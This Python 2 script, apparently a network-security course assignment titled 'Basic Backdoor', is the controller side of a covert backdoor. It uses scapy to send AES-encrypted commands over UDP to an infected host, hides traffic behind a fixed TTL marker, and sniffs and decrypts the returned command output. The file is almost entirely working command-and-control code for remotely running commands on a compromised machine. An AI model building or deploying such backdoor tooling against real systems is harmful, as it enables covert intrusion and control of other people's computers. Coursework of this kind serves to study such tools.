import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from AESCipher import AESCipher
import time #used for thread sleep methods
import argparse #used for easy arguments
import thread

def craft(payload):
    packet = (IP(dst=args.dest,ttl=ttlKey)/UDP(sport=int(args.port),dport=args.port)/ payload)
    return packet
    
def sendCommand(command):
    global cipher
    encrypt_Command = cipher.encrypt(command)
    packet = craft(encrypt_Command)
    send(packet)

def commandResult(packet):
    #if IP in packet[0]:
    global ttlKey
    global args
    global cipher
    srcIP = packet[IP].src
    ttl = packet[IP].ttl
    if packet[IP].ttl == ttlKey:
        #print(packet[UDP].load)
        print(cipher.decrypt(packet[UDP].load))
        return

def commandSniffer(threadName, infectedIP):
    sniff(filter="udp and host "+args.dest, prn=commandResult)

#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Assignment 3 by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-d', dest='dest', type = str, help = 'target ip', required=True)
arg_parser.add_argument('-p', dest='port', type = int, help = 'target port',default=99,const=99, nargs='?')
args = arg_parser.parse_args()
exit=["exit","quit","exit()","quit()"]

try:
   thread.start_new_thread( commandSniffer, ("commandSniffer",args.dest) )
except Exception,e: 
    print str(e)

while True:
    command = raw_input('\033[92m'+args.dest+":"+str(args.port)+" ready"+'\033[0m')
    if command == "":
        continue
    elif any(item == command for item in exit):
        sys.exit()
    else:
        sendCommand(command)
        